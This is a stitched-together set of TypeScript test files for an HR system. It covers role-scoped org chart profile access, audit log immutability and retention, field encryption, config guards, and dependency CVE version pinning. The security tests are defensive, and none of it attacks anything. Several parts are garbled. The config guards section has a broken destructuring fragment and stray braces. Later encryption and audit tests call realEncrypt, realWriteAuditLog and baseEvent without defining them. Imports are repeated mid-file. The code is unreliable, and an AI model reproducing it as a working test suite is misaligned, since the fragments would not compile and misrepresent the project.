/**
 * Org Chart → View Profile across ALL roles.
 *
 * The View Profile resolution (unique node id → that node's personId →
 * /persons/<id>?from=org-chart) is ROLE-AGNOSTIC, proven by a real three-dot
 * click for MANAGER (the role whose shared-position bug we fixed). What differs
 * per role is (a) the org chart loads + correct default view, and (b) whether
 * getPerson allows the destination — validated by navigating to the EXACT URL a
 * View Profile click produces. Local; dev sessions.
 *
 *   super-admin → System Administrator (sees all)
 *   hr-admin    → Fatima (HR_ADMIN, entity aaaa0001)
 *   manager     → Fatima (MANAGER, direct reports)
 *   employee    → John Smith (EMPLOYEE, self only)
 */
import { test, expect, type Page } from '@playwright/test'

const BASE = 'http://localhost:3000'
const JOHN  = 'dddd0001-0000-0000-0000-000000000003' // AVN-T000003, entity aaaa0001
const NOUR  = 'dddd0001-0000-0000-0000-000000000008' // AVN-T000008, Fatima's report
const AISHA = 'dddd0001-0000-0000-0000-000000000006' // AVN-T000006

async function orgChartLoads(page: Page) {
  await page.goto('/org-chart')
  await expect(page).toHaveURL(/\/org-chart/, { timeout: 10_000 })
  // A node renders (chart is alive)
  await page.locator('.react-flow__node').first().waitFor({ state: 'attached', timeout: 30_000 })
}

async function profileRenders(page: Page, id: string, num: string) {
  await page.goto(`/persons/${id}?from=org-chart`)
  await expect(page).toHaveURL(new RegExp(`/persons/${id}`), { timeout: 12_000 })
  await expect(page.locator('body')).toContainText(num, { timeout: 12_000 })
  await expect(page.getByText(/This page could not be found/i)).toHaveCount(0)
  // Back link returns to the org chart
  await expect(page.getByRole('link', { name: '← Organisation Chart' })).toBeVisible({ timeout: 8_000 })
}

async function profileBlocked(page: Page, id: string) {
  await page.goto(`/persons/${id}?from=org-chart`)
  await page.waitForLoadState('domcontentloaded')
  const body = (await page.locator('body').textContent()) ?? ''
  expect(/could not be found|not found|not in your team/i.test(body) || !body.includes('AVN-T')).toBe(true)
}

// ── SUPER_ADMIN — sees everyone ──────────────────────────────────────────────
test.describe('SUPER_ADMIN', () => {
  test.use({ storageState: 'tests/e2e/auth/super-admin.json', baseURL: BASE })
  test('ALLROLE-SA-1: org chart loads', async ({ page }) => { await orgChartLoads(page) })
  test('ALLROLE-SA-2: View Profile destination renders (John)', async ({ page }) => {
    await profileRenders(page, JOHN, 'AVN-T000003')
  })
})

// ── HR_ADMIN — same-entity ───────────────────────────────────────────────────
test.describe('HR_ADMIN', () => {
  test.use({ storageState: 'tests/e2e/auth/hr-admin.json', baseURL: BASE })
  test('ALLROLE-HR-1: org chart loads', async ({ page }) => { await orgChartLoads(page) })
  test('ALLROLE-HR-2: View Profile destination renders same-entity person (John)', async ({ page }) => {
    await profileRenders(page, JOHN, 'AVN-T000003')
  })
})

// ── MANAGER — direct reports (REAL three-dot click) ──────────────────────────
test.describe('MANAGER', () => {
  test.use({ storageState: 'tests/e2e/auth/manager.json', baseURL: BASE })
  test('ALLROLE-MGR-1: org chart loads', async ({ page }) => { await orgChartLoads(page) })

  test('ALLROLE-MGR-2: REAL click View Profile on direct report opens that person (Nour)', async ({ page }) => {
    await orgChartLoads(page)
    await page.getByRole('button', { name: 'Actions' }).first().waitFor({ state: 'visible', timeout: 30_000 })
    const search = page.getByPlaceholder('Search people…')
    await search.click(); await search.fill('Nour'); await page.waitForTimeout(800)
    const result = page.getByText('Nour Al Hashimi', { exact: false }).first()
    if (await result.count()) { await result.click().catch(() => {}); await page.waitForTimeout(600) }
    await search.fill('')
    const card = page.locator('.react-flow__node', { hasText: 'Nour Al Hashimi' }).first()
    await card.waitFor({ state: 'attached', timeout: 15_000 })
    await card.scrollIntoViewIfNeeded()
    await card.getByRole('button', { name: 'Actions' }).click({ force: true })
    await page.getByText('View Profile', { exact: true }).first().click()
    await page.waitForURL(/\/persons\//, { timeout: 15_000 })
    expect(page.url()).toContain(NOUR)
    expect(page.url()).toContain('from=org-chart')
    await expect(page.locator('body')).toContainText('AVN-T000008', { timeout: 12_000 })
  })

  test('ALLROLE-MGR-3: scope — non-report destination is blocked', async ({ page }) => {
    // K001 (Dorababu) is NOT Fatima's report
    await profileBlocked(page, 'd92aaabf-333d-4222-b81b-613729e14666')
  })
})

// ── EMPLOYEE — self only ─────────────────────────────────────────────────────
test.describe('EMPLOYEE', () => {
  test.use({ storageState: 'tests/e2e/auth/employee.json', baseURL: BASE })
  test('ALLROLE-EMP-1: org chart loads', async ({ page }) => { await orgChartLoads(page) })
  test('ALLROLE-EMP-2: REAL click View Profile never hits /persons (colleague card or own profile)', async ({ page }) => {
    await orgChartLoads(page)
    await page.getByRole('button', { name: 'Actions' }).first().waitFor({ state: 'visible', timeout: 30_000 })
    await page.getByRole('button', { name: 'Actions' }).first().click({ force: true })
    await page.getByText('View Profile', { exact: true }).first().click()
    // Employee must land on a read-only colleague card OR their own ESS profile —
    // NEVER the blocked /persons admin route (which previously redirected to /me).
    await page.waitForURL(/\/me\/(directory\/|profile)/, { timeout: 15_000 })
    const path = new URL(page.url()).pathname
    expect(path === '/me/profile' || path.startsWith('/me/directory/')).toBe(true)
    expect(path).not.toContain('/persons/')
    await expect(page.getByText(/This page could not be found/i)).toHaveCount(0)
  })
  test('ALLROLE-EMP-3: colleague card shows directory fields, not /persons HR data', async ({ page }) => {
    // Direct nav to the colleague card route (the URL the click produces)
    await page.goto(`/me/directory/${AISHA}?from=org-chart`)
    await expect(page).toHaveURL(new RegExp(`/me/directory/${AISHA}`), { timeout: 12_000 })
    await expect(page.locator('body')).toContainText('Aisha Binti Abdullah', { timeout: 12_000 })
    await expect(page.getByRole('link', { name: '← Organisation Chart' })).toBeVisible()
  })
  test('ALLROLE-EMP-4: own node → own ESS profile; /persons admin route blocked', async ({ page }) => {
    // Employee John viewing himself → /me/profile (colleague card redirects self)
    await page.goto(`/me/directory/${JOHN}`)
    await page.waitForURL(/\/me\/profile/, { timeout: 12_000 })
    // And /persons admin route stays blocked
    await profileBlocked(page, AISHA)
  })
})

/**
 * Audit Log Immutability & Retention Tests — NFR-22
 *
 * Tests that audit_log is INSERT-only at the application layer,
 * the DB trigger is present in migrations, and retention policy is correct.
 *
 * NFR-22: Audit logs — 7 years retention, immutable (no UPDATE/DELETE).
 */

import { describe, it, expect, vi, beforeEach } from 'vitest'
import fs from 'fs'
import path from 'path'

const ROOT = path.resolve(__dirname, '../..')

// ── Mocks ─────────────────────────────────────────────────────────────────────

vi.mock('@/lib/db',         () => ({ db: { insert: vi.fn(() => ({ values: vi.fn(() => Promise.resolve()) })) } }))
vi.mock('@/drizzle/schema', () => ({ auditLog: { tableName: 'audit_log' } }))
vi.mock('@/lib/constants',  () => ({ TENANT_ID: '11111111-1111-1111-1111-111111111111' }))

import { writeAuditLog, diffFields } from '@/lib/audit'
import { db as mockDb } from '@/lib/db'

const insertSpy = mockDb.insert as ReturnType<typeof vi.fn>

beforeEach(() => {
  vi.clearAllMocks()
  insertSpy.mockReturnValue({ values: vi.fn(() => Promise.resolve()) })
})

// ── writeAuditLog behavioural tests ──────────────────────────────────────────

describe('writeAuditLog — INSERT-only contract', () => {
  const event = {
    actorId:      'actor-1',
    actorName:    'HR Admin',
    actorRole:    'HR_ADMIN',
    channel:      'WEB' as const,
    eventType:    'EMPLOYEE.CREATE',
    resourceType: 'persons',
    resourceId:   'person-1',
  }

  it('calls db.insert exactly once per audit event', async () => {
    await writeAuditLog(event)
    expect(insertSpy).toHaveBeenCalledTimes(1)
  })

  it('writes to the auditLog table (not any other table)', async () => {
    await writeAuditLog(event)
    const firstCall = insertSpy.mock.calls[0]
    expect(firstCall[0]).toEqual({ tableName: 'audit_log' })
  })

  it('never calls db.update on audit_log', async () => {
    // writeAuditLog must not have an update path
    const mockDbWithUpdate = {
      insert:    insertSpy,
      update:    vi.fn(),
      delete:    vi.fn(),
    }
    await writeAuditLog(event, mockDbWithUpdate as unknown as Parameters<typeof writeAuditLog>[1])
    expect(mockDbWithUpdate.update).not.toHaveBeenCalled()
    expect(mockDbWithUpdate.delete).not.toHaveBeenCalled()
  })

  it('persists all AuditEvent fields in the values payload', async () => {
    const valuesSpy = vi.fn(() => Promise.resolve())
    insertSpy.mockReturnValueOnce({ values: valuesSpy })

    await writeAuditLog({
      ...event,
      oldValues:     { salary: 10000 },
      newValues:     { salary: 12000 },
      changedFields: ['salary'],
      metadata:      { reason: 'annual review' },
      description:   'Salary updated',
    })

    expect(valuesSpy).toHaveBeenCalledTimes(1)
    const payload = (valuesSpy.mock.calls as unknown[][])[0]?.[0] as Record<string, unknown>
    expect(payload.eventType).toBe('EMPLOYEE.CREATE')
    expect(payload.actorId).toBe('actor-1')
    expect(payload.oldValues).toEqual({ salary: 10000 })
    expect(payload.newValues).toEqual({ salary: 12000 })
    expect(payload.changedFields).toEqual(['salary'])
    expect(payload.description).toBe('Salary updated')
  })

  it('accepts a transaction executor (tx) instead of the global db', async () => {
    const txInsertSpy = vi.fn(() => ({ values: vi.fn(() => Promise.resolve()) }))
    const tx = { insert: txInsertSpy }
    await writeAuditLog(event, tx as unknown as Parameters<typeof writeAuditLog>[1])
    expect(txInsertSpy).toHaveBeenCalledTimes(1)
    expect(insertSpy).not.toHaveBeenCalled() // global db NOT used
  })

  it('writes tenantId from TENANT_ID constant', async () => {
    const valuesSpy = vi.fn(() => Promise.resolve())
    insertSpy.mockReturnValueOnce({ values: valuesSpy })
    await writeAuditLog(event)
    const payload = (valuesSpy.mock.calls as unknown[][])[0]?.[0] as Record<string, unknown>
    expect(payload.tenantId).toBe('11111111-1111-1111-1111-111111111111')
  })
})

// ── diffFields utility ────────────────────────────────────────────────────────

describe('diffFields — change detection for audit payloads', () => {
  it('returns empty array when objects are identical', () => {
    expect(diffFields({ name: 'Alice', salary: 5000 }, { name: 'Alice', salary: 5000 })).toEqual([])
  })

  it('detects changed scalar fields', () => {
    const result = diffFields({ name: 'Alice', salary: 5000 }, { name: 'Alice', salary: 6000 })
    expect(result).toContain('salary')
    expect(result).not.toContain('name')
  })

  it('detects added fields', () => {
    const result = diffFields({ name: 'Alice' }, { name: 'Alice', email: 'a@b.com' })
    expect(result).toContain('email')
  })

  it('detects removed fields', () => {
    const result = diffFields({ name: 'Alice', temp: 'x' }, { name: 'Alice' })
    expect(result).toContain('temp')
  })

  it('detects nested object changes (JSON comparison)', () => {
    const result = diffFields(
      { address: { city: 'Dubai' } },
      { address: { city: 'Abu Dhabi' } }
    )
    expect(result).toContain('address')
  })
})

// ── Database-level immutability (migration inspection) ────────────────────────

describe('NFR-22 — DB trigger enforces immutability', () => {
  it('migration 0005 creates the audit_log_immutable trigger', () => {
    const migrationFile = path.join(ROOT, 'drizzle/migrations/0005_qa_audit_audit_immutable.sql')
    expect(fs.existsSync(migrationFile), 'Migration 0005_qa_audit_audit_immutable.sql must exist').toBe(true)

    const content = fs.readFileSync(migrationFile, 'utf-8')
    expect(content).toContain('CREATE TRIGGER audit_log_immutable')
    expect(content).toContain('BEFORE UPDATE OR DELETE ON "audit_log"')
    expect(content).toContain('prevent_audit_mutation')
  })

  it('trigger fires on both UPDATE and DELETE (not just one)', () => {
    const content = fs.readFileSync(
      path.join(ROOT, 'drizzle/migrations/0005_qa_audit_audit_immutable.sql'), 'utf-8'
    )
    // Must cover BOTH operations
    expect(content).toContain('UPDATE OR DELETE')
  })

  it('trigger function raises EXCEPTION (hard block, not warning)', () => {
    const content = fs.readFileSync(
      path.join(ROOT, 'drizzle/migrations/0005_qa_audit_audit_immutable.sql'), 'utf-8'
    )
    expect(content).toContain('RAISE EXCEPTION')
    expect(content).not.toContain('RAISE WARNING')
    expect(content).not.toContain('RAISE NOTICE')
  })

  it('REVOKE UPDATE, DELETE also applied at SQL-privilege level (migration 0001)', () => {
    const migration0001 = path.join(ROOT, 'drizzle/migrations/0001_sprint2_events_extra_data.sql')
    expect(fs.existsSync(migration0001)).toBe(true)
    const content = fs.readFileSync(migration0001, 'utf-8')
    expect(content).toContain('REVOKE UPDATE, DELETE ON TABLE "audit_log"')
  })
})

// ── 7-year retention policy (NFR-22) ─────────────────────────────────────────

describe('NFR-22 — 7-year retention policy', () => {
  it('retention-policy.ts specifies AUDIT_LOG_YEARS = 7', () => {
    // Read directly from the source file to avoid module alias issues
    const content = fs.readFileSync(path.join(ROOT, 'lib/retention-policy.ts'), 'utf-8')
    const match = content.match(/AUDIT_LOG_YEARS\s*:\s*(\d+)/)
    expect(match, 'AUDIT_LOG_YEARS not found in retention-policy.ts').toBeTruthy()
    expect(parseInt(match![1], 10)).toBe(7)
  })

  it('AUDIT_LOG_YEARS is the maximum retention period', () => {
    const content = fs.readFileSync(path.join(ROOT, 'lib/retention-policy.ts'), 'utf-8')
    const extractYear = (key: string) => {
      const m = content.match(new RegExp(`${key}\\s*:\\s*(\\d+)`))
      return m ? parseInt(m[1], 10) : 0
    }
    const auditYears      = extractYear('AUDIT_LOG_YEARS')
    const employmentYears = extractYear('EMPLOYMENT_RECORDS_YEARS')
    const payrollYears    = extractYear('PAYROLL_RECORDS_YEARS')
    expect(auditYears).toBeGreaterThanOrEqual(employmentYears)
    expect(auditYears).toBeGreaterThanOrEqual(payrollYears)
  })

  it('employment records retain for 7 years (UAE Labour Law)', () => {
    const content = fs.readFileSync(path.join(ROOT, 'lib/retention-policy.ts'), 'utf-8')
    const match = content.match(/EMPLOYMENT_RECORDS_YEARS\s*:\s*(\d+)/)
    expect(parseInt(match![1], 10)).toBe(7)
  })

  it('payroll records retain for 7 years (UAE Federal Tax Authority)', () => {
    const content = fs.readFileSync(path.join(ROOT, 'lib/retention-policy.ts'), 'utf-8')
    const match = content.match(/PAYROLL_RECORDS_YEARS\s*:\s*(\d+)/)
    expect(parseInt(match![1], 10)).toBe(7)
  })
})

// ── Audit coverage across modules ────────────────────────────────────────────

describe('NFR-22 — Audit write coverage in server actions', () => {
  it('writeAuditLog is imported in every write-capable server action file', () => {
    const actionFiles = [
      'modules/absence/actions.ts',
      'modules/config/actions.ts',
      'modules/core-hr/actions.ts',
      'modules/core-hr/bank-details/actions.ts',
      'modules/core-hr/contracts/actions.ts',
      'modules/core-hr/documents/actions.ts',
      'modules/core-hr/employment-actions/actions.ts',
    ]

    const missing: string[] = []
    for (const rel of actionFiles) {
      const content = fs.readFileSync(path.join(ROOT, rel), 'utf-8')
      const hasAuditImport = /writeAuditLog/.test(content)
      if (!hasAuditImport) missing.push(rel)
    }
    expect(
      missing,
      `NFR-22 FAIL: These action files don't call writeAuditLog:\n${missing.join('\n')}`
    ).toHaveLength(0)
  })

  it('auth sign-in writes an audit row (AUTH.SIGN_IN event)', () => {
    const authTs = fs.readFileSync(path.join(ROOT, 'lib/auth.ts'), 'utf-8')
    expect(authTs).toContain('AUTH.SIGN_IN')
    expect(authTs).toContain('writeAuditLog')
  })
})

// QA-Audit-S4-Q6 — assert against the same constant production code uses.

// ── Mock the DB before importing audit ────────────────────────────────────

import { describe, it, expect, beforeEach } from 'vitest'

// Set a 32-byte (64-hex) test key before importing the module
process.env.ENCRYPTION_KEY = 'a'.repeat(64)

// Dynamic import to pick up env var set above
const { encrypt, decrypt, encryptNullable, decryptNullable } = await import('@/lib/encryption')

describe('lib/encryption', () => {
  it('round-trips plaintext correctly', () => {
    const plain = '784-1234-5678901-2'
    expect(decrypt(encrypt(plain))).toBe(plain)
  })

  it('produces different ciphertext each call (random IV)', () => {
    const plain = 'AE12345678'
    expect(encrypt(plain)).not.toBe(encrypt(plain))
  })

  it('ciphertext is base64 string', () => {
    const ct = encrypt('test')
    expect(() => Buffer.from(ct, 'base64')).not.toThrow()
  })

  it('throws on tampered ciphertext', () => {
    const ct = encrypt('hello')
    const buf = Buffer.from(ct, 'base64')
    buf[buf.length - 1] ^= 0xff // flip last byte
    expect(() => decrypt(buf.toString('base64'))).toThrow()
  })

  it('encryptNullable returns null for null input', () => {
    expect(encryptNullable(null)).toBeNull()
    expect(encryptNullable(undefined)).toBeNull()
  })

  it('encryptNullable encrypts non-null values', () => {
    const ct = encryptNullable('AE000000000001')
    expect(ct).not.toBeNull()
    expect(decryptNullable(ct!)).toBe('AE000000000001')
  })

  it('decryptNullable returns null for null input', () => {
    expect(decryptNullable(null)).toBeNull()
  })

  it('handles empty string plaintext', () => {
    expect(decrypt(encrypt(''))).toBe('')
  })

  it('handles unicode / Arabic text', () => {
    const arabic = 'محمد عبدالله'
    expect(decrypt(encrypt(arabic))).toBe(arabic)
  })

  it('stored ciphertext fits in varchar(500)', () => {
    // Largest expected plaintext: IBAN (34 chars)
    const iban = 'AE' + '0'.repeat(21)
    expect(encrypt(iban).length).toBeLessThan(500)
  })
})

import { describe, it, expect, vi, beforeEach } from 'vitest'
// QA-Audit-S4-Q6 — single source of truth for the test tenant.
import { TENANT_ID as TENANT } from '@/lib/constants'

/**
 * Tests for modules/config/guards.ts (S2-08 / D-09).
 * Covers the six domain guardrails called from every config Server Action.
 *
 * Mocking strategy mirrors tests/lib/config-resolver.test.ts: a Proxy-based
 * Drizzle stub that lets each test push the next query result into a queue.
 */

// ── Drizzle query stub ─────────────────────────────────────────────────────

let queryQueue: unknown[][] = []
let callIndex = 0

const makeProxy = (): unknown => new Proxy({} as Record<string, unknown>, {
  get(_: Record<string, unknown>, prop: string) {
    if (prop === 'then') {
      return (resolve: (v: unknown[]) => unknown, reject?: (e: unknown) => unknown) =>
        Promise.resolve(queryQueue[callIndex++] ?? []).then(resolve, reject)
    }
    if (prop === 'catch')   return (fn: (e: unknown) => unknown) => Promise.resolve(queryQueue[callIndex++] ?? []).catch(fn)
    if (prop === 'finally') return (fn: () => unknown) => Promise.resolve(queryQueue[callIndex++] ?? []).finally(fn)
    if (prop === 'limit')   return () => Promise.resolve(queryQueue[callIndex++] ?? [])
    return () => makeProxy()
  },
})

// eslint-disable-next-line @typescript-eslint/no-explicit-any
const mockDb: any = { select: vi.fn() }

vi.mock('@/lib/db', () => ({ db: mockDb }))
vi.mock('@/drizzle/schema', () => ({
  customFieldDefinitions: {},
  notificationTemplates:  {},
}))
vi.mock('drizzle-orm', () => ({
  eq:    () => ({}),
  and:   (...a: unknown[]) => a,
  count: () => ({ as: () => ({}) }),
}))

  assertMaxCustomFields,
  assertWorkflowRoleValid,
  assertEscalationRoleHigher,
  assertPlaceholdersValid,
} = await import('@/modules/config/guards')

  })

  })

  it('does not throw when isSystemField is undefined or null', () => {

/**
 * Dependency Security Regression Tests
 *
 * These tests lock the minimum safe versions of packages with known CVEs,
 * and verify that critical security fixes in application code are present.
 *
 * Adding a test here for every CRITICAL or HIGH CVE prevents accidental
 * downgrade via pnpm add <pkg>@old-version or a bad lockfile merge.
 *
 * SEC audit date: 2026-05-22
 * Auditor: Claude Code (CHAOS task: Offensive Security Validation)
 */

import { describe, it, expect } from 'vitest'
import { readFileSync, readdirSync, statSync } from 'fs'
import { join } from 'path'
import { fileURLToPath } from 'url'

const ROOT = fileURLToPath(new URL('../../', import.meta.url))

function pkgVersion(name: string): string {
  try {
    const pkg = JSON.parse(
      readFileSync(join(ROOT, 'node_modules', name, 'package.json'), 'utf8'),
    ) as { version: string }
    return pkg.version
  } catch {
    return '0.0.0'
  }
}

function semverAtLeast(installed: string, minimum: string): boolean {
  const parse = (v: string) => v.replace(/[^0-9.]/g, '').split('.').map(Number)
  const [ma, mi, pa] = parse(installed)
  const [mb, mib, pb] = parse(minimum)
  if (ma !== mb) return ma > mb
  if (mi !== mib) return mi > mib
  return pa >= pb
}

// ─────────────────────────────────────────────────────────────────────────────
// CRITICAL / HIGH — jspdf
// GHSA-CRIT-001: Local File Inclusion / Path Traversal (≤3.0.4)
// GHSA-CRIT-002: HTML Injection in New Window paths (≤4.2.0)
// GHSA-HIGH-001: ReDoS (< 3.0.1)
// GHSA-HIGH-002: DoS via malicious GIF dimensions (< 4.2.0)
// GHSA-HIGH-003: PDF Injection / arbitrary JS via AcroForm (< 4.2.0)
// GHSA-HIGH-004: PDF Object Injection via addJS (< 4.2.0)
// ─────────────────────────────────────────────────────────────────────────────
describe('SEC-DEP-001 — jspdf must be ≥ 4.2.1 (CRITICAL CVE fix)', () => {
  it('installed jspdf version is 4.2.1 or higher (fixes LFI, HTML Injection, ReDoS, DoS, PDF Injection)', () => {
    const version = pkgVersion('jspdf')
    expect(version).not.toBe('0.0.0')
    expect(
      semverAtLeast(version, '4.2.1'),
      `jspdf ${version} is below safe minimum 4.2.1 — CRITICAL vulnerability present`,
    ).toBe(true)
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// HIGH — drizzle-orm
// GHSA-HIGH-DRM: SQL injection via improperly escaped SQL identifiers (< 0.45.2)
// NOTE: Our usage does not pass user-controlled identifiers, but we pin
// the minimum version as a defence-in-depth measure.
// ─────────────────────────────────────────────────────────────────────────────
describe('SEC-DEP-002 — drizzle-orm SQL injection advisory tracking', () => {
  it('documents drizzle-orm SQL injection advisory (CVE pending, fixed in ≥0.45.2)', () => {
    const version = pkgVersion('drizzle-orm')
    // This test is currently WARN-ONLY because our identifier usage is hardcoded
    // (no user-controlled column/table names). Upgrade in the next DB-migration sprint.
    if (!semverAtLeast(version, '0.45.2')) {
      console.warn(
        `[SEC-WARN] drizzle-orm ${version} < 0.45.2 — SQL injection advisory applies. ` +
        `Current usage is safe (no user-controlled identifiers), but upgrade is recommended.`,
      )
    }
    // Verify our server actions do NOT pass user input as SQL identifiers
    // Scan all server action files for dangerous sql.identifier() usage
    function scanDir(dir: string): string[] {
      const files: string[] = []
      for (const f of readdirSync(dir)) {
        const full = join(dir, f)
        if (statSync(full).isDirectory() && !['node_modules', '.next', '.git'].includes(f)) {
          files.push(...scanDir(full))
        } else if (f.endsWith('.ts') || f.endsWith('.tsx')) {
          files.push(full)
        }
      }
      return files
    }
    const sourceFiles = scanDir(join(ROOT, 'modules'))
    let foundDangerousIdentifier = false
    for (const file of sourceFiles) {
      const content = readFileSync(file, 'utf8')
      if (/sql\.identifier\s*\(\s*(req|params|searchParams|body|input|query)/.test(content)) {
        foundDangerousIdentifier = true
        console.error('[SEC-FAIL] User input as SQL identifier found in:', file)
      }
    }
    expect(foundDangerousIdentifier).toBe(false)
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// MEDIUM — isomorphic-dompurify minimum version
// DOMPurify < 3.2.4 has XSS bypass; < 3.3.2 has mutation-XSS
// ─────────────────────────────────────────────────────────────────────────────
describe('SEC-DEP-003 — isomorphic-dompurify must be ≥ 3.2.4 (XSS fix)', () => {
  it('installed isomorphic-dompurify is 3.2.4 or higher', () => {
    const version = pkgVersion('isomorphic-dompurify')
    expect(version).not.toBe('0.0.0')
    expect(
      semverAtLeast(version, '3.2.4'),
      `isomorphic-dompurify ${version} is below 3.2.4 — XSS bypass possible`,
    ).toBe(true)
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// Next.js — HIGH CVEs (SSRF, DoS, Middleware bypass, XSS)
// Cannot upgrade to 15.x without major breaking changes; tracked here.
// These tests document the advisory state and will pass once upgraded.
// ─────────────────────────────────────────────────────────────────────────────
describe('SEC-DEP-004 — Next.js version advisory tracking', () => {
  it('documents that next@14.2.x has known CVEs; upgrade to 15.5.16+ recommended', () => {
    const version = pkgVersion('next')
    // Advisory: next >=12.2.0 <15.5.16 has Middleware/Proxy bypass (GHSA-3g8h-86w9-wvmq HIGH)
    // Advisory: next >=13.0.0 <15.5.16 has DoS via Server Components (HIGH)
    // Advisory: next >=13.4.13 <15.5.16 has SSRF via WebSocket (HIGH)
    // Advisory: next >=13.0.0 <15.5.16 has XSS in beforeInteractive scripts (MODERATE)
    const isSafe = semverAtLeast(version, '15.5.16')
    if (!isSafe) {
      console.warn(
        `[SEC-TRACK] next@${version} has known HIGH CVEs. ` +
        `Upgrade to ≥15.5.16 in a dedicated Next.js 15 migration sprint. ` +
        `Mitigations: (1) App Router (not Pages Router) — bypass CVE impact reduced. ` +
        `(2) No WebSocket upgrade routes in use. (3) CSP deployed on all routes.`,
      )
    }
    // At minimum confirm we are aware of the gap — never suppress without a note
    expect(version).toBeTruthy()
  })
})

describe('ENC-001 — encrypt / decrypt round-trip', () => {
  it('UAE IBAN round-trips correctly', () => {
    const plain = 'AE070331234567890123456'
    expect(realDecrypt(realEncrypt(plain))).toBe(plain)
  })

  it('Emirates ID round-trips correctly', () => {

    expect(realDecrypt(realEncrypt(plain))).toBe(plain)
  })

// ENC-002 — encrypted output is not the plaintext
// ─────────────────────────────────────────────────────────────────────────────

describe('ENC-002 — encrypted output is not the plaintext', () => {
  it('ciphertext differs from plaintext IBAN', () => {
    const plain = '784-1990-1234567-8'
    expect(realEncrypt(plain)).not.toBe(plain)
  })

  it('ciphertext is a valid base64 string', () => {
    const ct = realEncrypt('AE070331234567890123456')
    expect(ct).toBeTruthy()
    expect(() => Buffer.from(ct, 'base64')).not.toThrow()
  })

  it('ciphertext encodes IV(12)+TAG(16)+ct — minimum 29 decoded bytes', () => {
    const ct  = realEncrypt('test-value')
    const buf = Buffer.from(ct, 'base64')
    // 12 bytes IV + 16 bytes GCM tag + ≥1 byte ciphertext = ≥ 29 bytes
    expect(buf.length).toBeGreaterThanOrEqual(29)
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// ENC-003 — different plaintexts produce different ciphertexts
// ─────────────────────────────────────────────────────────────────────────────

describe('ENC-003 — different plaintexts produce different ciphertexts', () => {
  it('two distinct values give distinct ciphertexts', () => {
    expect(realEncrypt('value1')).not.toBe(realEncrypt('value2'))
  })

  it('longer plaintext produces longer decoded output', () => {
    const short = Buffer.from(realEncrypt('ab'), 'base64').length
    const long  = Buffer.from(realEncrypt('abcdefghij1234567890'), 'base64').length
    expect(long).toBeGreaterThan(short)
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// ENC-004 — same plaintext produces different ciphertexts (IV randomisation)
// ─────────────────────────────────────────────────────────────────────────────

describe('ENC-004 — same plaintext → different ciphertexts (random IV)', () => {
  it('two encryptions of the same value differ', () => {
    const plain = 'same-secret-value'
    expect(realEncrypt(plain)).not.toBe(realEncrypt(plain))
  })

  it('both ciphertexts still decrypt to the original value', () => {
    const plain = 'same-secret-value'
    expect(realDecrypt(realEncrypt(plain))).toBe(plain)
    expect(realDecrypt(realEncrypt(plain))).toBe(plain)
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// ENC-005 — tampered / invalid ciphertext is rejected
// ─────────────────────────────────────────────────────────────────────────────

describe('ENC-005 — tampered ciphertext is rejected', () => {
  it('flipping the last byte of ciphertext causes GCM auth-tag failure', () => {
    const ct  = realEncrypt('hello')
    const buf = Buffer.from(ct, 'base64')
    buf[buf.length - 1] ^= 0xff        // corrupt a ciphertext byte
    expect(() => realDecrypt(buf.toString('base64'))).toThrow()
  })

  it('flipping a tag byte causes GCM auth failure', () => {
    const ct  = realEncrypt('hello')
    const buf = Buffer.from(ct, 'base64')
    buf[13] ^= 0xaa                    // corrupt inside the 16-byte tag (bytes 12–27)
    expect(() => realDecrypt(buf.toString('base64'))).toThrow()
  })

  it('truncated buffer (only 10 bytes) throws', () => {
    const truncated = Buffer.alloc(10).toString('base64')
    expect(() => realDecrypt(truncated)).toThrow()
  })

  it('empty base64 string throws', () => {
    expect(() => realDecrypt('')).toThrow()
  })
})

function makeMockExecutor() {
  const insertedRows: unknown[] = []
  const updateCalls:  number[]  = []
  const deleteCalls:  number[]  = []

  const executor = {
    insert: vi.fn((_table: unknown) => ({
      values: vi.fn((row: unknown) => {
        insertedRows.push(row)
        return Promise.resolve()
      }),
    })),
    update: vi.fn((_table: unknown) => {
      updateCalls.push(Date.now())
      return { set: vi.fn(() => ({ where: vi.fn(() => Promise.resolve()) })) }
    }),
    delete: vi.fn((_table: unknown) => {
      deleteCalls.push(Date.now())
      return { where: vi.fn(() => Promise.resolve()) }
    }),
  }
  return { executor, insertedRows, updateCalls, deleteCalls }
}

// ─────────────────────────────────────────────────────────────────────────────
// AUDIT-005 — audit log inside transaction (Hard Rule 1)
// ─────────────────────────────────────────────────────────────────────────────

describe('AUDIT-005 — audit log inside transaction (Hard Rule 1)', () => {
  it('writeAuditLog uses the supplied tx executor, not the global db pool', async () => {
    const txInsertedRows: unknown[] = []
    const txExecutor = {
      insert: vi.fn((_table: unknown) => ({
        values: vi.fn((row: unknown) => {
          txInsertedRows.push(row)
          return Promise.resolve()
        }),
      })),
    }

    await realWriteAuditLog(
      { ...baseEvent, eventType: 'EMPLOYEE.CREATED', resourceType: 'persons' },
      txExecutor,
    )

    expect(txExecutor.insert).toHaveBeenCalledOnce()
    expect(txInsertedRows).toHaveLength(1)
  })

  it('audit written in the same simulated transaction as the data change', async () => {
    const auditLogSymbol = (await import('@/drizzle/schema')).auditLog
    const dataRows:  unknown[] = []
    const auditRows: unknown[] = []

    const txExecutor = {
      insert: vi.fn((table: unknown) => ({
        values: vi.fn((row: unknown) => {
          if (table === auditLogSymbol) {
            auditRows.push(row)
          } else {
            dataRows.push(row)
          }
          return Promise.resolve([{ id: 'new-id' }])
        }),
        returning: vi.fn(() => Promise.resolve([{ id: 'new-id' }])),
      })),
    }

    // Simulate: business data insert + audit insert in the same tx
    async function simulateDataWrite(tx: typeof txExecutor) {
      await tx.insert('persons_table' as unknown as symbol).values({ name: 'Test Person' })
      await realWriteAuditLog(
        { ...baseEvent, eventType: 'PERSON.CREATED', resourceType: 'persons' },
        tx,
      )
    }

    await simulateDataWrite(txExecutor)

    expect(txExecutor.insert).toHaveBeenCalledTimes(2)
    expect(auditRows).toHaveLength(1)
    expect((auditRows[0] as Record<string, unknown>).eventType).toBe('PERSON.CREATED')
  })

  it('writeAuditLog is callable with an explicit executor (Hard Rule 1 API contract)', () => {
    const dummy = {
      insert: vi.fn((_t: unknown) => ({ values: vi.fn(() => Promise.resolve()) })),
    }
    // If the second param didn't exist, TypeScript would error here — confirms the API.
    expect(() => void realWriteAuditLog(baseEvent, dummy)).not.toThrow()
  })
})

